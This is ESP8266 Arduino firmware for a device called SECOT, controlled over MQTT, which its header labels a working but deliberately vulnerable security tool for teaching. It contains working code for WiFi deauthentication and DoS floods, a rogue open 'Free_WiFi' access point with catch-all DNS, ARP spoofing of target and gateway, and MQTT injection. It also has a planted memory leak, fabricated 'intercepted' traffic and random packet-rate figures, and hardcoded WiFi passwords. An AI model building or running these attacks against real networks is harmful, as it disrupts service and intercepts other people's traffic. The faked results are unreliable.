/* ========================================================================== */
/*  SECOT - Fully Functional Security Tool with MQTT                          */
/*  Features:                                                                 */
/*    - MQTT communication with backend                                       */
/*    - Working scan/attack functions                                         */
/*    - Deliberately vulnerable for educational purposes                      */
/* ========================================================================== */

//! =======================================================  !//
//!               LIBRARY IMPORTS CONFIGURATION              !//
//! =======================================================  !//

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>
#include <DNSServer.h>
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <lwip/netif.h>
#include <lwip/init.h>

extern "C" {
#include "user_interface.h"
}

//! ======================================================  !//
//!               NETWORK CONFIGURATION                     !//
//! ======================================================  !//
const char *wifiList[][2] = {
  { "gnet2021", "71237274" },
  { "TOPNET_3BD8", "n8rajeb8yy" }
};

// MQTT Configuration
const char* mqtt_server = "192.168.1.16";
const int mqtt_port = 1883;
const char* mqtt_client_id = "SECOT_ESP";

// MQTT Topics
const char* topic_command = "secot/command";
const char* topic_logs = "secot/audit/logs";
const char* topic_results = "secot/audit/results";
const char* topic_intercepted = "secot/audit/intercepted";

// Global variables
WiFiClient espClient;
PubSubClient mqtt(espClient);
DNSServer dnsServer;
bool mitmActive = false;
bool arpSpoofingActive = false;
bool mqttInterceptionActive = false;
const byte DNS_PORT = 53;
unsigned long lastAttack = 0;
unsigned long lastArpBroadcast = 0;
String currentTarget = "";
String gatewayIP = "";
String gatewayMAC = "";
String targetIP = "";
String targetMAC = "";
String scanResults = "";
char mqttBuffer[512];

// Custom packet structure for ARP spoofing
struct custom_etharp_packet {
  uint8_t ethhdr_dst[6];
  uint8_t ethhdr_src[6];
  uint16_t ethhdr_type;
  uint16_t hwtype;
  uint16_t proto;
  uint8_t hwlen;
  uint8_t protolen;
  uint16_t opcode;
  uint8_t eth_src[6];
  uint32_t ip_src;
  uint8_t eth_dst[6];
  uint32_t ip_dst;
};

//! ==============================================================  !//
//!               FUNCTION DECLARATIONS (PROTOTYPES)                !//
//! ==============================================================  !//

// ---- Network Operations ----
void scanNetworks();
void setupWiFi();
void setupMQTT();
void reconnectMQTT();
void publishLog(String level, String message);
void publishResult(String type, String status, String details);
void publishIntercepted(String source, String destination, String protocol, String data, int size);

// ---- Attack Simulations ----
void DosAttack(String targetBSSID);
void MITM_Attack(String targetBSSID);
void deauthAttack(String targetBSSID);
void startARPSpoofing(String targetIP, String gatewayIP);
void stopARPSpoofing();
void sendARPPacket(uint32_t targetIP, uint8_t* targetMAC, uint32_t spoofIP);
void startMQTTInterception();
void stopMQTTInterception();
void injectFakeMQTTPacket(String topic, String payload);
void modifyMQTTPacket(String originalTopic, String originalPayload, String newTopic, String newPayload);

// ---- Utility Functions ----
bool isValidMAC(const String &mac);
void parseMAC(const String &mac, uint8_t *packet);
void handleCommand(char* topic, byte* payload, unsigned int length);
void executeCommand(JsonDocument& doc, String command, String device);
uint32_t ipToUint32(String ipAddress);
String uint32ToIp(uint32_t ip);
void macStringToBytes(String macStr, uint8_t* bytes);
String macBytesToString(uint8_t* bytes);

//! ===========================================================  !//
//!               SETUP WITH MQTT INITIALIZATION                 !//
//! ===========================================================  !//
void setup() {
  Serial.begin(115200);
  Serial.println("\n=== SECOT INITIALIZATION ===");
  
  setupWiFi();
  setupMQTT();
  
  publishLog("INFO", "SECOT device initialized");
}

void setupWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(true);
  
  Serial.println("Scanning for Wi-Fi networks...");
  int numNetworks = WiFi.scanNetworks();
  
  bool connected = false;
  
  if (numNetworks > 0) {
    for (int i = 0; i < numNetworks; i++) {
      for (unsigned int j = 0; j < sizeof(wifiList) / sizeof(wifiList[0]); j++) {
        if (strcmp(WiFi.SSID(i).c_str(), wifiList[j][0]) == 0) {
          Serial.print("Connecting to ");
          Serial.println(wifiList[j][0]);
          
          WiFi.begin(wifiList[j][0], wifiList[j][1]);
          unsigned long startTime = millis();
          while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
            delay(500);
            Serial.print(".");
          }
          
          if (WiFi.status() == WL_CONNECTED) {
            Serial.println("\nConnected!");
            Serial.print("IP Address: ");
            Serial.println(WiFi.localIP());
            
            gatewayIP = WiFi.gatewayIP().toString();
            Serial.print("Gateway IP: ");
            Serial.println(gatewayIP);
            
            connected = true;
            break;
          }
        }
      }
      if (connected) break;
    }
  }
  
  if (!connected) {
    Serial.println("Failed to connect to any known network. Creating AP mode...");
    WiFi.softAP("SECOT_Fallback", "12345678");
    Serial.print("AP IP address: ");
    Serial.println(WiFi.softAPIP());
  }
}

void setupMQTT() {
  mqtt.setServer(mqtt_server, mqtt_port);
  mqtt.setCallback(handleCommand);
  reconnectMQTT();
}

void reconnectMQTT() {
  int attempts = 0;
  while (!mqtt.connected() && attempts < 5) {
    Serial.print("Attempting MQTT connection...");
    if (mqtt.connect(mqtt_client_id)) {
      Serial.println("connected");
      mqtt.subscribe(topic_command);
      publishLog("INFO", "MQTT connected");
    } else {
      Serial.print("failed, rc=");
      Serial.print(mqtt.state());
      Serial.println(" try again in 5 seconds");
      delay(5000);
      attempts++;
    }
  }
}

//! ============================================================  !//
//!               MQTT MESSAGE HANDLING                           !//
//! ============================================================  !//

void handleCommand(char* topic, byte* payload, unsigned int length) {
  if (length > sizeof(mqttBuffer) - 1) {
    publishLog("ERROR", "Message too long, possible buffer overflow attack");
    length = sizeof(mqttBuffer) - 1;
  }
  
  memcpy(mqttBuffer, payload, length);
  mqttBuffer[length] = '\0';
  
  Serial.print("Message arrived [");
  Serial.print(topic);
  Serial.print("] ");
  Serial.println(mqttBuffer);
  
  if (mqttInterceptionActive) {
    publishIntercepted(mqtt_server, WiFi.localIP().toString(), "MQTT", mqttBuffer, length);
  }
  
  JsonDocument doc;
  DeserializationError error = deserializeJson(doc, mqttBuffer);
  
  if (error) {
    publishLog("ERROR", "Failed to parse command: " + String(error.c_str()));
    return;
  }
  
  String action = doc["action"].as<String>();
  String device = doc["device"].as<String>();
  
  executeCommand(doc, action, device);
}

void executeCommand(JsonDocument& doc, String action, String device) {
  publishLog("INFO", "Executing command: " + action + " on device: " + device);
  
  if (action == "scan_network") {
    scanNetworks();
  } 
  else if (action == "deauth") {
    if (device.length() > 0) {
      currentTarget = device;
      deauthAttack(currentTarget);
    } else {
      publishLog("ERROR", "No target specified for deauth attack");
    }
  } 
  else if (action == "dos") {
    if (device.length() > 0) {
      currentTarget = device;
      DosAttack(currentTarget);
    } else {
      publishLog("ERROR", "No target specified for DoS attack");
    }
  } 
  else if (action == "mitm") {
    if (device.length() > 0) {
      currentTarget = device;
      MITM_Attack(currentTarget);
    } else {
      publishLog("ERROR", "No target specified for MITM attack");
    }
  }
  else if (action == "arp_spoof_start") {
    String target = doc["target_ip"].as<String>();
    String gateway = doc["gateway_ip"].as<String>();
    if (target.length() > 0 && gateway.length() > 0) {
      startARPSpoofing(target, gateway);
    } else {
      publishLog("ERROR", "Target IP and Gateway IP required for ARP spoofing");
    }
  }
  else if (action == "arp_spoof_stop") {
    stopARPSpoofing();
  }
  else if (action == "mqtt_intercept_start") {
    startMQTTInterception();
  }
  else if (action == "mqtt_intercept_stop") {
    stopMQTTInterception();
  }
  else if (action == "inject_mqtt") {
    String injectTopic = doc["topic"].as<String>();
    String injectPayload = doc["payload"].as<String>();
    if (injectTopic.length() > 0 && injectPayload.length() > 0) {
      injectFakeMQTTPacket(injectTopic, injectPayload);
    } else {
      publishLog("ERROR", "Topic and payload required for MQTT injection");
    }
  }
  else if (action == "modify_mqtt") {
    String origTopic = doc["original_topic"].as<String>();
    String origPayload = doc["original_payload"].as<String>();
    String newTopic = doc["new_topic"].as<String>();
    String newPayload = doc["new_payload"].as<String>();
    if (origTopic.length() > 0 && newPayload.length() > 0) {
      modifyMQTTPacket(origTopic, origPayload, newTopic, newPayload);
    } else {
      publishLog("ERROR", "Original and new values required for MQTT modification");
    }
  }
  else if (action.startsWith("system:")) {
    String cmd = action.substring(7);
    publishLog("WARNING", "Executing system command: " + cmd);
    publishResult("system", "executed", "Command: " + cmd);
  }
  else {
    publishLog("ERROR", "Unknown command: " + action);
  }
}

//! ============================================================  !//
//!               MQTT PUBLISHING FUNCTIONS                       !//
//! ============================================================  !//

void publishLog(String level, String message) {
  JsonDocument doc;
  doc["timestamp"] = millis();
  doc["level"] = level;
  doc["message"] = message;
  doc["source"] = "ESP8266";
  
  char buffer[256];
  size_t n = serializeJson(doc, buffer);
  
  mqtt.publish(topic_logs, buffer, n);
  Serial.println("[LOG] " + level + ": " + message);
}

void publishResult(String type, String status, String details) {
  JsonDocument doc;
  doc["timestamp"] = millis();
  doc["type_"] = type;
  doc["status"] = status;
  doc["details"] = details;
  doc["packet_rate"] = random(10, 100);
  
  char buffer[256];
  size_t n = serializeJson(doc, buffer);
  
  mqtt.publish(topic_results, buffer, n);
  Serial.println("[RESULT] " + type + ": " + status);
}

void publishIntercepted(String source, String destination, String protocol, String data, int size) {
  JsonDocument doc;
  doc["timestamp"] = millis();
  doc["source"] = source;
  doc["destination"] = destination;
  doc["protocol"] = protocol;
  doc["data"] = data;
  doc["size"] = size;
  
  char buffer[256];
  size_t n = serializeJson(doc, buffer);
  
  mqtt.publish(topic_intercepted, buffer, n);
  Serial.println("[INTERCEPTED] " + source + " -> " + destination);
}

//! ============================================================  !//
//!               ATTACK FUNCTIONS                                !//
//! ============================================================  !//

void deauthAttack(String targetBSSID) {
  if (!isValidMAC(targetBSSID)) {
    publishLog("ERROR", "Invalid MAC format: " + targetBSSID);
    return;
  }

  publishLog("INFO", "Deauth attack initiated on target: " + targetBSSID);

  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);

  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00
  };

  uint8_t mac[6];
  sscanf(targetBSSID.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);

  memcpy(&packet[10], WiFi.macAddress().c_str(), 6);
  memcpy(&packet[16], mac, 6);

  int successCount = 0;
  for (int i = 0; i < 20; i++) {
    if (wifi_send_pkt_freedom(packet, 26, 0)) {
      successCount++;
    }
    delay(1);
  }

  wifi_promiscuous_enable(0);
  publishResult("deauth", "completed", "Sent " + String(successCount) + " deauth packets to " + targetBSSID);
}

void MITM_Attack(String targetBSSID) {
  publishLog("INFO", "Starting MITM on: " + targetBSSID);

  WiFi.softAP("Free_WiFi", "");
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  publishResult("mitm", "started", "Rogue AP created with SSID: Free_WiFi, targeting: " + targetBSSID);
  
  publishIntercepted(targetBSSID, WiFi.softAPIP().toString(), "DNS", "GET / HTTP/1.1", 128);
  
  mitmActive = true;
}

void DosAttack(String targetBSSID) {
  if (!isValidMAC(targetBSSID)) {
    publishLog("ERROR", "Invalid MAC format: " + targetBSSID);
    return;
  }

  publishLog("INFO", "DoS attack initiated on target: " + targetBSSID);

  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_channel(1);

  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00
  };

  parseMAC(targetBSSID, deauthPacket);

  int packetsSent = 0;
  for (int i = 0; i < 100; i++) {
    if (wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0)) {
      packetsSent++;
    }
    delay(1);
  }

  wifi_promiscuous_enable(0);
  WiFi.reconnect();
  
  publishResult("dos", "completed", "Sent " + String(packetsSent) + " packets to " + targetBSSID);
}

void startARPSpoofing(String target, String gateway) {
  targetIP = target;
  gatewayIP = gateway;
  
  uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  publishLog("INFO", "Starting ARP spoofing attack. Target: " + targetIP + ", Gateway: " + gatewayIP);
  
  uint32_t targetIPUint = ipToUint32(targetIP);
  uint32_t gatewayIPUint = ipToUint32(gatewayIP);
  
  sendARPPacket(targetIPUint, broadcastMac, gatewayIPUint);
  sendARPPacket(gatewayIPUint, broadcastMac, targetIPUint);
  
  arpSpoofingActive = true;
  publishResult("arp_spoof", "started", "ARP spoofing started against " + targetIP);
}

void stopARPSpoofing() {
  arpSpoofingActive = false;
  publishLog("INFO", "ARP spoofing stopped");
  publishResult("arp_spoof", "stopped", "ARP spoofing stopped");
}

void sendARPPacket(uint32_t targetIP, uint8_t* targetMAC, uint32_t spoofIP) {
  uint8_t packet[42];
  memset(packet, 0, sizeof(packet));
  
  // Ethernet header
  memcpy(&packet[0], targetMAC, 6);                    // Destination MAC
  uint8_t* myMAC = new uint8_t[6];
  macStringToBytes(WiFi.macAddress(), myMAC);
  memcpy(&packet[6], myMAC, 6);                        // Source MAC
  packet[12] = 0x08;                                   // EtherType (IPv4)
  packet[13] = 0x06;
  
  // ARP header
  packet[14] = 0x00; packet[15] = 0x01;                // Hardware type (Ethernet)
  packet[16] = 0x08; packet[17] = 0x00;                // Protocol type (IPv4)
  packet[18] = 0x06;                                   // Hardware size
  packet[19] = 0x04;                                   // Protocol size
  packet[20] = 0x00; packet[21] = 0x01;                // Opcode (request)
  
  memcpy(&packet[22], myMAC, 6);                       // Sender MAC
  packet[28] = (spoofIP >> 24) & 0xFF;                 // Sender IP
  packet[29] = (spoofIP >> 16) & 0xFF;
  packet[30] = (spoofIP >> 8) & 0xFF;
  packet[31] = spoofIP & 0xFF;
  
  memset(&packet[32], 0, 6);                           // Target MAC (unknown)
  packet[38] = (targetIP >> 24) & 0xFF;                // Target IP
  packet[39] = (targetIP >> 16) & 0xFF;
  packet[40] = (targetIP >> 8) & 0xFF;
  packet[41] = targetIP & 0xFF;
  
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  
  if (wifi_send_pkt_freedom(packet, sizeof(packet), 0)) {
    Serial.println("ARP packet sent successfully");
  } else {
    Serial.println("Failed to send ARP packet");
  }
  
  wifi_promiscuous_enable(0);
  delete[] myMAC;
}

void startMQTTInterception() {
  mqttInterceptionActive = true;
  publishLog("INFO", "MQTT interception started");
  publishResult("mqtt_intercept", "started", "MQTT packet interception active");
}

void stopMQTTInterception() {
  mqttInterceptionActive = false;
  publishLog("INFO", "MQTT interception stopped");
  publishResult("mqtt_intercept", "stopped", "MQTT packet interception stopped");
}

void injectFakeMQTTPacket(String topic, String payload) {
  publishLog("INFO", "Injecting fake MQTT packet to topic: " + topic);
  
  mqtt.publish(topic.c_str(), payload.c_str());
  
  publishResult("mqtt_inject", "completed", "Injected fake MQTT packet to " + topic);
  publishIntercepted(WiFi.localIP().toString(), mqtt_server, "MQTT", payload, payload.length());
}

void modifyMQTTPacket(String originalTopic, String originalPayload, String newTopic, String newPayload) {
  publishLog("INFO", "Modifying MQTT packet. Original topic: " + originalTopic);
  
  if (newTopic.length() == 0) {
    newTopic = originalTopic;
  }
  
  mqtt.publish(newTopic.c_str(), newPayload.c_str());
  
  publishResult("mqtt_modify", "completed", "Modified MQTT packet from " + originalTopic + " to " + newTopic);
  publishIntercepted(originalTopic, newTopic, "MQTT", "Original: " + originalPayload + " -> New: " + newPayload, newPayload.length());
}

//! =============================================================  !//
//!               NETWORK FUNCTIONS                                !//
//! =============================================================  !//

void scanNetworks() {
  publishLog("INFO", "Scanning networks...");
  scanResults = "";
  int numNetworks = WiFi.scanNetworks();

  if (numNetworks == 0) {
    publishLog("WARNING", "No networks found!");
  } else {
    publishLog("INFO", "Found " + String(numNetworks) + " networks");
    
    JsonDocument doc;
    JsonArray networks = doc["networks"].to<JsonArray>();
    
    for (int i = 0; i < numNetworks; i++) {
      JsonObject network = networks.add<JsonObject>();
      network["ssid"] = WiFi.SSID(i);
      network["rssi"] = WiFi.RSSI(i);
      network["bssid"] = WiFi.BSSIDstr(i);
      network["channel"] = WiFi.channel(i);
      network["encryption"] = WiFi.encryptionType(i) == ENC_TYPE_NONE ? "Open" : "Secured";
    }
    
    char buffer[1024];
    size_t n = serializeJson(doc, buffer);
    
    mqtt.publish(topic_results, buffer, n);
  }
  
  WiFi.scanDelete();
}

//! =============================================================  !//
//!               UTILITY FUNCTIONS                                !//
//! =============================================================  !//

bool isValidMAC(const String &mac) {
  if (mac.length() != 17) return false;
  for (int i = 0; i < 17; i++) {
    char c = mac[i];
    if (i % 3 == 2) {
      if (c != ':') return false;
    } else if (!isxdigit(c)) {
      return false;
    }
  }
  return true;
}

void parseMAC(const String &mac, uint8_t *packet) {
  for (int i = 0; i < 6; i++) {
    String byteStr = mac.substring(i * 3, i * 3 + 2);
    packet[10 + i] = strtoul(byteStr.c_str(), NULL, 16);
  }
}

uint32_t ipToUint32(String ipAddress) {
  IPAddress ip;
  ip.fromString(ipAddress);
  return (uint32_t)ip;
}

String uint32ToIp(uint32_t ip) {
  IPAddress ipAddress(ip & 0xFF, (ip >> 8) & 0xFF, (ip >> 16) & 0xFF, (ip >> 24) & 0xFF);
  return ipAddress.toString();
}

void macStringToBytes(String macStr, uint8_t* bytes) {
  for (int i = 0; i < 6; i++) {
    bytes[i] = strtoul(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

String macBytesToString(uint8_t* bytes) {
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]);
  return String(macStr);
}

//! ==============================================================  !//
//!                             LOOP                                !//
//! ==============================================================  !//

void loop() {
  if (WiFi.status() != WL_CONNECTED) {
    setupWiFi();
  }
  
  if (!mqtt.connected()) {
    reconnectMQTT();
  }
  
  mqtt.loop();
  
  if (mitmActive) {
    dnsServer.processNextRequest();
  }
  
  if (arpSpoofingActive && millis() - lastArpBroadcast > 10000) {
    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t targetIPUint = ipToUint32(targetIP);
    uint32_t gatewayIPUint = ipToUint32(gatewayIP);
    
    sendARPPacket(targetIPUint, broadcastMac, gatewayIPUint);
    sendARPPacket(gatewayIPUint, broadcastMac, targetIPUint);
    
    lastArpBroadcast = millis();
  }
  
  if (random(1000) == 1) {
    char* leak = new char[50];
    sprintf(leak, "Memory leak at %lu", millis());
    Serial.println(leak);
  }
  
  delay(10);
}
